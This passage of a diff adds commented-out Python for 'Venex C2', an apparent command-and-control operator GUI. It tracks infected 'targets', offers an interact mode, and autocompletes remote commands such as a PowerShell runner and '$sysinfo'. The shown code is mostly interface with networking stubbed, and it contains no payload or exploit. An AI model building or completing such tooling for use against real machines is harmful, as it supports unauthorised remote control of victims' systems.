+#         self.refresh_file_explorer()
+
+#     def open_file(self, p):
+#         try:
+#             if platform.system() == 'Windows':
+#                 os.startfile(p)
+#             else:
+#                 subprocess.run(['xdg-open', p])
+#         except: pass
+
+#     def delete_selected_file(self):
+#         sel = self.files_tree.selection()
+#         if not sel: return
+#         name = self.files_tree.item(sel[0])['values'][0][2:]
+#         path = os.path.join(self.current_path, name)
+#         if messagebox.askyesno("Confirm", f"Delete {name}?"):
+#             try:
+#                 if os.path.isdir(path):
+#                     shutil.rmtree(path)
+#                 else:
+#                     os.remove(path)
+#                 self.refresh_file_explorer()
+#             except: pass
+
+#     def is_ip(self, s):
+#         try:
+#             ipaddress.ip_address(s)
+#             return True
+#         except:
+#             return False
+
+#     def cleanup_old_targets(self):
+#         while True:
+#             time.sleep(30)
+#             if not self.connected: continue
+#             now = datetime.now()
+#             with self.target_lock:
+#                 to_remove = [tid for tid, info in self.targets.items() if now - info["last"] > timedelta(minutes=5)]
+#                 for tid in to_remove:
+#                     del self.targets[tid]
+#                     self.gui_queue.put((self._remove_target_from_tree, (tid,)))
+#             if to_remove and self.interacting_with_target in to_remove:
+#                 self.gui_queue.put((self.switch_to_normal_mode, ()))
+
+#     def _remove_target_from_tree(self, tid):
+#         for item in self.targets_tree.get_children():
+#             if self.targets_tree.item(item, "values")[0] == tid:
+#                 self.targets_tree.delete(item)
+#                 break
+
+#     def process_gui_updates(self):
+#         while not self.gui_queue.empty():
+#             func, args = self.gui_queue.get()
+#             func(*args)
+#         self.after(100, self.process_gui_updates)
+
+#     # === AUTOCOMPLETE METHODS ===
+#     def clear_ghost(self):
+#         try:
+#             self.internal_entry.selection_clear()
+#         except tk.TclError:
+#             pass
+
+#     def update_suggestion(self):
+#         self.clear_ghost()
+#         actual_text = self.cmd_entry.get()
+
+#         if " " in actual_text or not actual_text:
+#             return
+
+#         cursor_pos = self.internal_entry.index("insert")
+#         if cursor_pos != len(actual_text):
+#             return
+
+#         lower_text = actual_text.lower()
+#         matches = [cmd for cmd in self.current_commands if cmd.lower().startswith(lower_text)]
+#         if not matches:
+#             return
+
+#         suggestion = min(matches, key=len)
+
+#         if suggestion.lower() == lower_text:
+#             return
+
+#         self.cmd_entry.delete(0, tk.END)
+#         self.cmd_entry.insert(0, suggestion)
+
+#         typed_len = len(actual_text)
+#         self.internal_entry.icursor(typed_len)
+#         self.internal_entry.selection_range(typed_len, tk.END)
+
+#     def on_key_release(self, event):
+#         if event.keysym in {"Tab", "Return", "Left", "Right", "Up", "Down", "Shift_L", "Shift_R", "Control_L", "Control_R", "BackSpace"}:
+#             return
+#         self.update_suggestion()
+
+#     def on_backspace(self, event):
+#         if self.internal_entry.selection_present():
+#             sel_start = self.internal_entry.index("sel.first")
+#             cursor_pos = self.internal_entry.index("insert")
+#             if cursor_pos == sel_start:
+#                 if sel_start > 0:
+#                     self.cmd_entry.delete(sel_start - 1)
+#                     self.internal_entry.icursor(sel_start - 1)
+#                 self.clear_ghost()
+#                 self.update_suggestion()
+#                 return "break"
+
+#         self.after(10, self.update_suggestion)
+#         return
+
+#     def on_tab(self, event):
+#         if self.internal_entry.selection_present():
+#             self.clear_ghost()
+#             self.internal_entry.icursor(tk.END)
+#             return "break"
+#         return "break"
+
+#     def on_right_arrow(self, event):
+#         try:
+#             if self.internal_entry.selection_present():
+#                 sel_start = self.internal_entry.index("sel.first")
+#                 if self.internal_entry.index("insert") == sel_start:
+#                     self.clear_ghost()
+#                     self.internal_entry.icursor(tk.END)
+#                     return "break"
+#         except tk.TclError:
+#             pass
+
+# if __name__ == "__main__":
+#     app = PremiumC2Client()
+#     app.mainloop()
+
+
+
+
+# import base64
+# import hashlib
+# import socket
+# import threading
+# import time
+# import tkinter as tk
+# from tkinter import messagebox, filedialog, ttk
+# import customtkinter as ctk
+# from datetime import datetime, timedelta
+# from queue import Queue
+# import re
+# import ipaddress
+# import os
+# import subprocess
+# import platform
+# import shutil
+
+# # --- Premium Windows 11 Styling ---
+# ctk.set_appearance_mode("Dark")
+# ctk.set_default_color_theme("blue")
+
+# # Color Palette
+# ACCENT_BLUE = "#0078d4"
+# ACCENT_HOVER = "#005a9e"
+# BG_DARK = "#202020"
+# CARD_DARK = "#2b2b2b"
+# TEXT_PRIMARY = "#ffffff"
+# TEXT_SECONDARY = "#a0a0a0"
+# SUCCESS_GREEN = "#22DD22"
+# DANGER_RED = "#d13438"
+
+# class PremiumC2Client(ctk.CTk):
+#     def __init__(self):
+#         super().__init__()
+#         # Window configuration
+#         self.title("Venex C2 - Windows 11 Edition")
+#         self.geometry("1400x900")
+#         self.minsize(1100, 750)
+#         self.configure(fg_color=BG_DARK)
+
+#         # Logic Variables
+#         self.server_ip = tk.StringVar(value="127.0.0.1")
+#         self.server_port = tk.IntVar(value=7777)
+#         self.auth_token = tk.StringVar(value="your token")
+#         self.connected = False
+#         self.socket = None
+#         self.targets = {}
+#         self.target_lock = threading.Lock()
+#         self.interacting_with_target = None
+#         self.gui_queue = Queue()
+#         self.content_box_path = os.path.join(os.getcwd(), "content_box")
+#         self.current_path = self.content_box_path
+#         if not os.path.exists(self.content_box_path):
+#             os.makedirs(self.content_box_path)
+
+#         # === AUTOCOMPLETE COMMAND LISTS ===
+#         self.global_commands = ["AUTH:STOP_HTTP", "AUTH:START_HTTP"]
+#         self.target_commands = ["tm powershell -cmmand \"\"", "$sysinfo", "rmf"]
+        
+#         self.current_commands = self.global_commands  # default mode
+
+#         # Setup UI
+#         self.setup_premium_ui()
+
+#         # Background processes
+#         self.cleanup_thread = threading.Thread(target=self.cleanup_old_targets, daemon=True)
+#         self.cleanup_thread.start()
+#         self.after(100, self.process_gui_updates)
+#         self.refresh_file_explorer()
+
+#     def setup_premium_ui(self):
+#         self.grid_columnconfigure(1, weight=1)
+#         self.grid_rowconfigure(0, weight=1)
+
+#         # --- Sidebar Navigation ---
+#         self.sidebar = ctk.CTkFrame(self, width=260, corner_radius=0, fg_color="#1a1a1a")
+#         self.sidebar.grid(row=0, column=0, rowspan=2, sticky="nsew")
+#         self.sidebar.grid_rowconfigure(4, weight=1)
+
+#         # Logo
+#         self.logo_label = ctk.CTkLabel(self.sidebar, text="VENEX C2", font=ctk.CTkFont(size=24, weight="bold"))
+#         self.logo_label.grid(row=0, column=0, padx=30, pady=(40, 30))
+
+#         # Nav Buttons
+#         self.btn_dashboard = self.create_nav_button("Dashboard", "📊", 1, self.show_dashboard)
+#         self.btn_content = self.create_nav_button("Content Box", "📁", 2, self.show_content)
+#         self.btn_settings = self.create_nav_button("Settings", "⚙️", 3, self.show_settings)
+
+#         # Sidebar Footer
+#         self.status_indicator = ctk.CTkLabel(self.sidebar, text="● Disconnected", text_color=DANGER_RED, font=ctk.CTkFont(size=12))
+#         self.status_indicator.grid(row=5, column=0, padx=30, pady=(0, 20), sticky="w")
+
+#         # --- Main Content Area ---
+#         self.main_area = ctk.CTkFrame(self, corner_radius=20, fg_color=BG_DARK)
+#         self.main_area.grid(row=0, column=1, sticky="nsew", padx=30, pady=30)
+#         self.main_area.grid_columnconfigure(0, weight=1)
+#         self.main_area.grid_rowconfigure(1, weight=1)
+
+#         # Top Bar (Connection)
+#         self.top_bar = ctk.CTkFrame(self.main_area, fg_color="transparent")
+#         self.top_bar.grid(row=0, column=0, sticky="ew", pady=(0, 20))
+
+#         conn_card = ctk.CTkFrame(self.top_bar, fg_color=CARD_DARK, corner_radius=12, height=70)
+#         conn_card.pack(fill="x")
+
+#         ctk.CTkLabel(conn_card, text="Server:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(20, 5))
+#         self.ip_entry = ctk.CTkEntry(conn_card, textvariable=self.server_ip, width=150, border_width=0, fg_color="#3d3d3d")
+#         self.ip_entry.pack(side="left", padx=5, pady=15)
+
+#         ctk.CTkLabel(conn_card, text="Port:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(15, 5))
+#         self.port_entry = ctk.CTkEntry(conn_card, textvariable=self.server_port, width=80, border_width=0, fg_color="#3d3d3d")
+#         self.port_entry.pack(side="left", padx=5, pady=15)
+
+#         self.connect_btn = ctk.CTkButton(conn_card, text="Connect", command=self.toggle_connection,
+#                                         fg_color=ACCENT_BLUE, hover_color=ACCENT_HOVER, corner_radius=8, width=120, font=ctk.CTkFont(weight="bold"))
+#         self.connect_btn.pack(side="right", padx=20, pady=15)
+
+#         # Views Container
+#         self.views = {}
+#         self.setup_dashboard_view()
+#         self.setup_content_view()
+#         self.setup_settings_view()
+
+#         self.show_dashboard()
+
+#         # --- Bottom Command Bar ---
+#         self.cmd_bar = ctk.CTkFrame(self, height=120, fg_color="#1a1a1a", corner_radius=0)
+#         self.cmd_bar.grid(row=1, column=1, sticky="ew")
+#         self.cmd_bar.grid_columnconfigure(0, weight=1)
+
+#         self.mode_label = ctk.CTkLabel(self.cmd_bar, text="MODE: C2 SERVER", font=ctk.CTkFont(size=11, weight="bold"), text_color=TEXT_SECONDARY)
+#         self.mode_label.grid(row=0, column=0, padx=30, pady=(15, 0), sticky="w")
+
+#         cmd_input_container = ctk.CTkFrame(self.cmd_bar, fg_color="transparent")
+#         cmd_input_container.grid(row=1, column=0, sticky="ew", padx=30, pady=(5, 20))
+#         cmd_input_container.grid_columnconfigure(0, weight=1)
+
+#         self.cmd_entry = ctk.CTkEntry(cmd_input_container, placeholder_text="Type a command (e.g., help, interact ID)...",
+#                                      height=45, corner_radius=10, border_width=1, border_color="#3d3d3d", fg_color="#252525")
+#         self.cmd_entry.grid(row=0, column=0, sticky="ew", padx=(0, 15))
+#         self.cmd_entry.configure(font=("Consolas", 13))
+
+#         self.send_btn = ctk.CTkButton(cmd_input_container, text="Execute", command=self.send_command,
+#                                      width=100, height=45, corner_radius=10, fg_color=ACCENT_BLUE)
+#         self.send_btn.grid(row=0, column=1)
+
+#         # === AUTOCOMPLETE SETUP ===
+#         self.internal_entry = self.cmd_entry._entry
+#         self.internal_entry.configure(
+#             selectbackground="#252525",
+#             selectforeground="#cccccc"    # bright ghost text
+#         )
+
+#         self.internal_entry.bind("<KeyRelease>", self.on_key_release)
+#         self.internal_entry.bind("<BackSpace>", self.on_backspace)
+#         self.internal_entry.bind("<Tab>", self.on_tab)
+#         self.internal_entry.bind("<Right>", self.on_right_arrow)
+#         self.internal_entry.bind("<Return>", lambda e: self.send_command())
+
+#     def create_nav_button(self, text, icon, row, command):
+#         btn = ctk.CTkButton(self.sidebar, text=f" {icon} {text}", anchor="w", height=45,
+#                            fg_color="transparent", hover_color="#2d2d2d", corner_radius=8,
+#                            font=ctk.CTkFont(size=14), command=command)
+#         btn.grid(row=row, column=0, padx=20, pady=5, sticky="ew")
+#         return btn
+
+#     def setup_dashboard_view(self):
+#         view = ctk.CTkFrame(self.main_area, fg_color="transparent")
+#         self.views["dashboard"] = view
+#         view.grid_columnconfigure(0, weight=2)
+#         view.grid_columnconfigure(1, weight=1)
+#         view.grid_rowconfigure(0, weight=1)
+
+#         left_col = ctk.CTkFrame(view, fg_color="transparent")
+#         left_col.grid(row=0, column=0, sticky="nsew", padx=(0, 20))
+#         left_col.grid_columnconfigure(0, weight=1)
+#         left_col.grid_rowconfigure(0, weight=1)
+#         left_col.grid_rowconfigure(1, weight=1)
+
+#         target_card = ctk.CTkFrame(left_col, fg_color=CARD_DARK, corner_radius=15)
+#         target_card.grid(row=0, column=0, sticky="nsew", pady=(0, 20))
+#         target_card.grid_columnconfigure(0, weight=1)
+#         target_card.grid_rowconfigure(1, weight=1)
+
+#         ctk.CTkLabel(target_card, text="Active Targets", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
+
+#         style = ttk.Style()
+#         style.theme_use("clam")
+#         style.configure("Treeview", background=CARD_DARK, foreground=TEXT_PRIMARY, fieldbackground=CARD_DARK, borderwidth=0, rowheight=40)
+#         style.map("Treeview", background=[('selected', ACCENT_BLUE)])
+
+#         self.targets_tree = ttk.Treeview(target_card, columns=("id", "last", "status"), show="headings")
+#         self.targets_tree.heading("id", text="TARGET ID")
+#         self.targets_tree.heading("last", text="LAST SEEN")
+#         self.targets_tree.heading("status", text="STATUS")
+#         self.targets_tree.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))
+
+#         self.target_menu = tk.Menu(self, tearoff=0, bg=CARD_DARK, fg=TEXT_PRIMARY, borderwidth=0)
+#         self.target_menu.add_command(label="Interact", command=self.interact_with_target)
+#         self.targets_tree.bind("<Button-3>", self.show_target_menu)
+
+#         output_card = ctk.CTkFrame(left_col, fg_color=CARD_DARK, corner_radius=15)
+#         output_card.grid(row=1, column=0, sticky="nsew")
+#         output_card.grid_columnconfigure(0, weight=1)
+#         output_card.grid_rowconfigure(1, weight=1)
+
+#         ctk.CTkLabel(output_card, text="Terminal Output", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
+#         self.output_text = ctk.CTkTextbox(output_card, fg_color="#1a1a1a", text_color=SUCCESS_GREEN, font=("Consolas", 13), corner_radius=10)
+#         self.output_text.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))
+
+#         log_card = ctk.CTkFrame(view, fg_color=CARD_DARK, corner_radius=15)
+#         log_card.grid(row=0, column=1, sticky="nsew")
+#         log_card.grid_columnconfigure(0, weight=1)
+#         log_row = 1
+#         log_card.grid_rowconfigure(log_row, weight=1)
+
+#         ctk.CTkLabel(log_card, text="System Logs", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
+#         self.log_text = ctk.CTkTextbox(log_card, fg_color="#1a1a1a", text_color=TEXT_SECONDARY, font=("Segoe UI", 11), corner_radius=10)
+#         self.log_text.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))
+
+#     def setup_content_view(self):
+#         view = ctk.CTkFrame(self.main_area, fg_color="transparent")
+#         self.views["content"] = view
+#         view.grid_columnconfigure(0, weight=1)
+#         view.grid_rowconfigure(1, weight=1)
+
+#         header = ctk.CTkFrame(view, fg_color="transparent")
+#         header.grid(row=0, column=0, sticky="ew", pady=(0, 20))
+#         ctk.CTkLabel(header, text="Content Box Explorer", font=ctk.CTkFont(size=20, weight="bold")).pack(side="left")
+#         ctk.CTkButton(header, text="Refresh", width=80, command=self.refresh_file_explorer).pack(side="right")
+
+#         self.file_tree = ttk.Treeview(view, columns=("name", "size", "type"), show="headings")
+#         self.file_tree.heading("name", text="NAME")
+#         self.file_tree.heading("size", text="SIZE")
+#         self.file_tree.heading("type", text="TYPE")
+#         self.file_tree.grid(row=1, column=0, sticky="nsew")
+
+#     def setup_settings_view(self):
+#         view = ctk.CTkFrame(self.main_area, fg_color=CARD_DARK, corner_radius=15)
+#         self.views["settings"] = view
+#         ctk.CTkLabel(view, text="Settings & Configuration", font=ctk.CTkFont(size=20, weight="bold")).pack(pady=40)
+#         ctk.CTkLabel(view, text="Auth Token:", font=ctk.CTkFont(weight="bold")).pack(pady=5)
+#         ctk.CTkEntry(view, textvariable=self.auth_token, width=300, fg_color="#3d3d3d", border_width=0).pack(pady=10)
+
+#     def show_dashboard(self): self.switch_view("dashboard")
+#     def show_content(self): self.switch_view("content")
+#     def show_settings(self): self.switch_view("settings")
+
+#     def switch_view(self, name):
+#         for v in self.views.values(): v.grid_forget()
+#         self.views[name].grid(row=1, column=0, sticky="nsew")
+
+#     def toggle_connection(self):
+#         if not self.connected:
+#             self.log("Attempting to connect...")
+#             self.connected = True
+#             self.connect_btn.configure(text="Disconnect", fg_color=DANGER_RED)
+#             self.status_indicator.configure(text="● Connected", text_color=SUCCESS_GREEN)
+#         else:
+#             self.connected = False
+#             self.connect_btn.configure(text="Connect", fg_color=ACCENT_BLUE)
+#             self.status_indicator.configure(text="● Disconnected", text_color=DANGER_RED)
+
+#     def send_command(self):
+#         cmd = self.cmd_entry.get().strip()
+#         if not cmd: return
+#         self.output(f"> {cmd}")
+#         self.cmd_entry.delete(0, tk.END)
+#         self.clear_ghost()
+
+#     def log(self, msg):
+#         self.log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
+#         self.log_text.see(tk.END)
+
+#     def output(self, msg):
+#         self.output_text.insert(tk.END, f"{msg}\n")
+#         self.output_text.see(tk.END)
+
+#     def refresh_file_explorer(self): pass
+#     def cleanup_old_targets(self): pass
+#     def process_gui_updates(self): self.after(100, self.process_gui_updates)
+#     def show_target_menu(self, event): pass
+#     def interact_with_target(self): pass
+
+#     # === AUTOCOMPLETE LOGIC ===
+#     def clear_ghost(self):
+#         try:
+#             self.internal_entry.selection_clear()
+#         except tk.TclError:
+#             pass
+
+#     def update_suggestion(self):
+#         # We don't clear ghost here anymore because it's handled by selection management
+#         actual_text = self.cmd_entry.get()
+
+#         # If there's a selection, the "actual text" is what's before the selection
+#         if self.internal_entry.selection_present():
+#             sel_start = self.internal_entry.index("sel.first")
+#             actual_text = actual_text[:sel_start]
+
+#         if not actual_text or " " in actual_text:
+#             return
+
+#         lower_text = actual_text.lower()
+#         matches = [cmd for cmd in self.current_commands if cmd.lower().startswith(lower_text)]
+        
+#         if not matches:
+#             return
+
+#         # Find the best match (shortest one that starts with the text)
+#         suggestion = min(matches, key=len)
+
+#         # If the suggestion is exactly what we typed, no need to show it as a ghost
+#         if suggestion.lower() == lower_text:
+#             return
+
+#         # Update the entry: keep what user typed, append the rest as selected text
+#         self.cmd_entry.delete(0, tk.END)
+#         self.cmd_entry.insert(0, suggestion)
+        
+#         typed_len = len(actual_text)
+#         self.internal_entry.icursor(typed_len)
+#         self.internal_entry.selection_range(typed_len, tk.END)
+
+#     def on_key_release(self, event):
+#         # Ignore navigation and control keys
+#         if event.keysym in {"Tab", "Return", "Left", "Right", "Up", "Down", 
+#                            "Shift_L", "Shift_R", "Control_L", "Control_R", 
+#                            "BackSpace", "Escape", "Caps_Lock"}:
+#             return
+#         self.update_suggestion()
+
+#     def on_backspace(self, event):
+#         if self.internal_entry.selection_present():
+#             # If ghost text is present, backspace should just remove the ghost text
+#             # and then let the default backspace handle the last character of actual text
+#             sel_start = self.internal_entry.index("sel.first")
+#             self.cmd_entry.delete(sel_start, tk.END)
+#             self.internal_entry.icursor(sel_start)
+#             # We don't return "break" here, so the default backspace deletes the char before sel_start
+#             # But we need to update suggestions after that happens
+#             self.after(1, self.update_suggestion)
+#             return
+        
+#         # Standard backspace: just update suggestions after the character is deleted
+#         self.after(1, self.update_suggestion)
+
+#     def on_tab(self, event):
+#         if self.internal_entry.selection_present():
+#             # Accept the suggestion
+#             self.internal_entry.icursor(tk.END)
+#             self.internal_entry.selection_clear()
+#             return "break"
+#         return "break"
+
+#     def on_right_arrow(self, event):
+#         if self.internal_entry.selection_present():
+#             # Accept the suggestion
+#             self.internal_entry.icursor(tk.END)
+#             self.internal_entry.selection_clear()
+#             return "break"
+
+# if __name__ == "__main__":
+#     app = PremiumC2Client()
+#     app.mainloop()
